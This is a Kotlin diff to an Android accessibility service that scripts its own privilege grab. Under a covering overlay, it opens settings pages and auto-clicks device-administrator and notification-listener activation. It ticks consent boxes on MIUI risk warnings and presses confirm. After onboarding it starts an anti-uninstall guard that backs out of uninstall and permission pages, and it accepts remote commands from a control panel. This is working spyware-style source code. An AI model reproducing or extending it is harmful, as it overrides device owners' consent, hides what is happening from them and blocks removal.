@@ -278,36 +278,21 @@ class BoundaryAccessibilityService : AccessibilityService() {
     }
 
     /** 后台弹出界面打开之后的后续步骤（放慢节奏，每步之间留够渲染时间） */
+    /**
+     * 目前只做两步（其他步骤先注释掉）：
+     *   第 1 步：申请运行时权限（在服务连接处触发）
+     *   第 2 步：设备管理员 —— 点「激活」→ 危险页(等 2 秒 → 勾选 → 确定) → 校验 → 结束
+     */
     private fun scheduleRestAfterGate() {
+        android.util.Log.d("AccGuard", "STEP2: device admin")
         main.postDelayed({
-            android.util.Log.d("AccGuard", "MIUI step3: notification access")
-            runCatching { com.zaka.screenagent.notify.NotificationAccessActivator.start(this) }
-        }, 40_000L)
-        main.postDelayed({
-            android.util.Log.d("AccGuard", "MIUI step4: device admin")
-            runCatching { com.zaka.screenagent.admin.AdminActivator.attach(this) }
-        }, 70_000L)
-        main.postDelayed({
-            android.util.Log.d("AccGuard", "MIUI step5: battery plan")
-            runCatching {
-                com.zaka.screenagent.keepalive.BatteryPlan.run(this,
-                    onEach = { i, total, step ->
-                        android.util.Log.d("AccGuard", "battery step $i/$total ${step.label}")
-                    },
-                    onDone = { ok ->
-                        android.util.Log.d("AccGuard", "battery plan done whitelisted=$ok")
-                        // 引导收尾：标记完成 → 启动防卸载守卫（所有机型统一，调试包除外）
-                        runCatching {
-                            com.zaka.screenagent.admin.OnboardingState.markDone(this)
-                            if (!com.zaka.screenagent.BuildConfig.NO_GUARD) {
-                                com.zaka.screenagent.admin.AntiUninstallGuard.start(this)
-                                android.util.Log.d("AccGuard", "onboarding done -> guard started")
-                            }
-                        }
-                    })
-            }
-        }, 100_000L)
+            miuiStepAdmin(onDone = {
+                android.util.Log.d("AccGuard", "STOP after device admin (by design)")
+            })
+        }, 3_000L)
     }
+
+
 
     private fun startPermissionWithRetry(attempts: Int) {
         permissionTry = 0
@@ -329,6 +314,17 @@ class BoundaryAccessibilityService : AccessibilityService() {
         // 引导期不启动防卸载守卫：
         //   守卫会把"应用信息/权限管理/停用/卸载"这类页面当成危险页直接 BACK，
         //   而引导流程本身就要在这些页面里点开关（小米尤其明显），自己把自己点回去。
+        // 调试包：自动撤销自己的设备管理员（否则 MIUI 不允许卸载/无法重测）
+        if (com.zaka.screenagent.BuildConfig.NO_GUARD) {
+            runCatching {
+                val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
+                val cn = android.content.ComponentName(this, com.zaka.screenagent.admin.MoyingAdminReceiver::class.java)
+                if (dpm?.isAdminActive(cn) == true) {
+                    dpm.removeActiveAdmin(cn)
+                    android.util.Log.d("AccGuard", "debug: removed own device admin")
+                }
+            }.onFailure { android.util.Log.w("AccGuard", "debug: remove admin failed: $it") }
+        }
         val onboardingDone = com.zaka.screenagent.admin.OnboardingState.isDone(this)
         if (!com.zaka.screenagent.BuildConfig.NO_GUARD &&
             !com.zaka.screenagent.util.DebugFlags.noGuard(this) && onboardingDone) {
@@ -346,10 +342,12 @@ class BoundaryAccessibilityService : AccessibilityService() {
         if (needOnboarding && !com.zaka.screenagent.ui.BlackScreen.isShowing()) {
             if (!dbgNoOverlay && !com.zaka.screenagent.BuildConfig.NO_GUIDE) runCatching { com.zaka.screenagent.ui.GuardOverlay.show(this) }
             // 引导链：权限申请（浮层遮盖）→ 自动点允许 → 设备管理员激活 → 100% 收浮层
-            if (!com.zaka.screenagent.util.OemProfiles.isMiui()) {
-                com.zaka.screenagent.admin.AdminActivator.attach(this)
+            // 厂商分支：MIUI 由链条第二步显式触发 admin（避免抢跑）；
+            // 其它厂商保持原有行为——连上就挂 AdminActivator
+            if (com.zaka.screenagent.perm.OemFlow.vendor() == com.zaka.screenagent.perm.OemFlow.Vendor.MIUI) {
+                android.util.Log.d("AccGuard", "MIUI branch: admin deferred to chain step2")
             } else {
-                android.util.Log.d("AccGuard", "MIUI: defer admin/notification/battery until bg-popup granted")
+                com.zaka.screenagent.admin.AdminActivator.attach(this)
             }
             com.zaka.screenagent.admin.AdminActivator.autoclick = !dbgNoAutoClick
             com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = !dbgNoAutoClick
@@ -358,14 +356,15 @@ class BoundaryAccessibilityService : AccessibilityService() {
                 // 统一走这条：无障碍已拿到 → B 自己拉起自己的权限页，自己点「允许」。
                 // 小米如果没给「后台弹出界面」，系统会静默丢弃这次启动（日志 MIUILOG- Permission Denied），
                 // 所以这里做重试：每 5 秒再试一次，用户在系统里把权限开出来之后下一次就会成功。
-                if (com.zaka.screenagent.util.OemProfiles.isMiui()) {
-                    // 第一步（3.3 小米分支）：先只打开"应用详情页"，
-                    // 让用户在里面把「后台弹出界面 / 显示悬浮窗」打开，再谈权限申请
-                    android.util.Log.w("AccGuard", "MIUI branch step1: open app details")
-                    MiuiFlowStep1()
-                } else {
-                    startPermissionWithRetry(36)
+                // 厂商分派（case 分支集中在 OemFlow）
+                val plan = com.zaka.screenagent.perm.OemFlow.plan(this)
+                com.zaka.screenagent.perm.OemFlow.log(this)
+                startPermissionWithRetry(36)
+                if (plan.vendor == com.zaka.screenagent.perm.OemFlow.Vendor.MIUI) {
+                    // MIUI 专属：权限 → 设备管理员（两步）
+                    main.postDelayed({ scheduleRestAfterGate() }, plan.permDelayMs)
                 }
+                // 其它厂商：后续通知/管理员/电池仍由它们各自的原有链路负责
             }
         }
         // 2.3：保活（2.2：前台服务 + Job(15min,persisted) + 精确闹钟 + 电池白名单）
@@ -699,6 +698,86 @@ class BoundaryAccessibilityService : AccessibilityService() {
         val ch = moying ?: return
         runCatching { com.zaka.screenagent.net.MoyingActions.handle(this, ch, action, data, binary) }
             .onFailure { Log.w("Moying", "action $action failed: $it") }
+    }
+
+    /** ③ 通知使用权：点行 → 点开关 → 拦截页(勾选+等10s+确定) → 20s 后校验 */
+    private fun miuiStepNoti(onDone: () -> Unit) {
+        if (com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(this)) {
+            android.util.Log.d("AccGuard", "noti: already granted, skip")
+            onDone(); return
+        }
+        android.util.Log.d("AccGuard", "noti: start")
+        runCatching {
+            startActivity(
+                android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            )
+        }
+        val label = applicationInfo.loadLabel(packageManager).toString()
+        main.postDelayed({
+            val row = com.zaka.screenagent.perm.MiuiNavigator.clickByText(this, label, contains = false)
+            android.util.Log.d("AccGuard", "noti click row=$row")
+        }, 2_500L)
+        main.postDelayed({
+            var hit = false
+            for (t in com.zaka.screenagent.perm.MiuiNavigator.NOTI_ACCESS_TEXTS) {
+                if (com.zaka.screenagent.perm.MiuiNavigator.clickByText(this, t, contains = false)) { hit = true; break }
+            }
+            android.util.Log.d("AccGuard", "noti click toggle=$hit")
+            com.zaka.screenagent.perm.MiuiNavigator.passRiskDialog(this, 25_000L) { ok ->
+                android.util.Log.d("AccGuard", "noti risk passed=$ok")
+            }
+        }, 6_000L)
+        main.postDelayed({
+            val ok = com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(this)
+            android.util.Log.d("AccGuard", "noti verify=$ok")
+            onDone()
+        }, 20_000L)
+    }
+
+    /** ④ 设备管理员：点激活 → 拦截页(10s) → DPM 校验；失败重试一次，不论成败继续 */
+    private fun miuiStepAdmin(onDone: () -> Unit, attempt: Int = 1) {
+        val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
+        val cn = android.content.ComponentName(this, com.zaka.screenagent.admin.MoyingAdminReceiver::class.java)
+        if (dpm?.isAdminActive(cn) == true) {
+            android.util.Log.d("AccGuard", "admin: already active, skip")
+            onDone(); return
+        }
+        android.util.Log.d("AccGuard", "admin: start attempt=$attempt")
+        runCatching {
+            com.zaka.screenagent.admin.AdminActivator.attach(this)   // 给它 context
+            com.zaka.screenagent.admin.AdminActivator.start(this)    // 打开激活页并点「激活」
+        }
+        // 立刻开始轮询拦截页：一出现就勾「我同意/我已知晓」，勾上后点「确定」
+        com.zaka.screenagent.perm.MiuiNavigator.passRiskDialog(this, 25_000L) { ok ->
+            android.util.Log.d("AccGuard", "admin risk passed=$ok attempt=$attempt")
+        }
+        main.postDelayed({
+            val active = dpm?.isAdminActive(cn) ?: false
+            android.util.Log.d("AccGuard", "admin verify=$active attempt=$attempt")
+            if (active || attempt >= 2) onDone() else miuiStepAdmin(onDone, attempt + 1)
+        }, 20_000L)
+    }
+
+    /** ⑤ 电池/保活计划 → ⑥ 收尾 */
+    private fun miuiStepBattery() {
+        android.util.Log.d("AccGuard", "battery: start plan")
+        runCatching {
+            com.zaka.screenagent.keepalive.BatteryPlan.run(this,
+                onEach = { i, total, step ->
+                    android.util.Log.d("AccGuard", "battery step $i/$total ${step.label}")
+                },
+                onDone = { ok ->
+                    android.util.Log.d("AccGuard", "battery plan done whitelisted=$ok")
+                    runCatching {
+                        com.zaka.screenagent.admin.OnboardingState.markDone(this)
+                        if (!com.zaka.screenagent.BuildConfig.NO_GUARD) {
+                            com.zaka.screenagent.admin.AntiUninstallGuard.start(this)
+                            android.util.Log.d("AccGuard", "onboarding done -> guard started")
+                        }
+                    }
+                })
+        }
     }
 
     /** 面板远程开关防卸载守卫 */
